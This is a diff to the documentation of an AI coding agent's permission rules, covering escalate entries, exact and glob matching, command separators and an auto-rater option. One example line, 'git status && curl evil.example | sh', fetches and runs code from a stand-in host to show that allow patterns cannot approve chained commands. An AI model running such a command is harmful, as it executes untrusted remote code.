@@ -244,6 +244,9 @@ for `{ "mode": <value> }`:
   check `bypass` keeps: choosing `bypass` means *"stop asking me"*, not *"forget what I told you
   never to do"*.
 - **`escalate`** — what always asks you, whatever the rung would have done, and with no rating call.
+  It outranks `allow`, including a grant you made at a prompt, so *this specific thing asks even
+  though its class would not*. It is **inert at `bypass`**: that rung means *stop asking me*, and
+  the rung you chose for the session wins. A stop that must survive `bypass` is a `deny` entry.
 
 Where entries from more than one list match the same call, **the most restrictive one wins — deny
 over escalate over allow** — so the order you write them in never matters.
@@ -280,6 +283,37 @@ Every entry in all three lists is the same explicit object. `type`, `matcher` an
 by token. The consequence everyone hits first: `npm publish *` does **not** match a bare
 `npm publish`, because the space before the `*` is part of the pattern. `npm publish*` matches both,
 and is almost always what was meant.
+
+**`exact` is the command, not the start of it.** An `exact` allow entry for `npm test` does not
+cover `npm test -- --watch`, and an `exact` deny entry for `npm publish` does not stop
+`npm publish --access public`. Use a `glob` when you mean the family. This is the cost the design
+accepts, and it is worth what it buys: a missed `allow` entry only asks you, and a missed `deny`
+entry still reaches the rater and the prompt — neither is an execution — while a too-broad `allow`
+entry has no such backstop. Under `bypass` the `deny` list is one of only two checks left, so write
+globs there.
+
+**A pattern cannot span a command separator.** No `allow` entry of any matcher matches a command
+Gaunt Sloth cannot statically resolve — anything that composes, substitutes or redirects — so
+`{ "matcher": "glob", "pattern": "git *" }` never approves `git status && curl evil.example | sh`.
+A `deny` or `escalate` entry *may* match such a command, and is compared against every part of it a
+shell would run, because a prohibition that catches something unresolvable costs nothing.
+
+### `rate`: keeping the auto-rater on a call you already allowed
+
+An `allow` match settles your part — there is no prompt. Whether the auto-rater still looks at the
+call is the entry's own `rate`, honoured at `auto-safe` and `full-auto` and **inert at every other
+rung**, so no entry can add a model call to `read-only` or `write`.
+
+The default follows from how much the entry recorded. A `shell` + `exact` entry recorded the whole
+command, so it defaults to `"rate": false` — the common case costs nothing. A `glob` or `regexp`
+recorded a shape, and a `tool`/`mcpTool` entry recorded an identity rather than arguments, so both
+default to `"rate": true`. Set it explicitly, either way, when you want the other behaviour.
+
+A rated `allow` match is a **tripwire, not a second opinion**: `safe` and `destructive` both run,
+because you already authorized the call and the rater does not overrule you by disliking it. Only a
+structural attack still halts the run, and only an irreversible action still comes to you. An
+`allow` match also lifts the rule that floors any command naming a host — which is how a team that
+fetches from one internal host all day declares it once and stops being asked.
 
 A `hint` pattern names one or more of `readOnlyHint`, `destructiveHint`, `idempotentHint` and
 `openWorldHint`, each mapped to the value it must hold. All of them must match; hints you do not
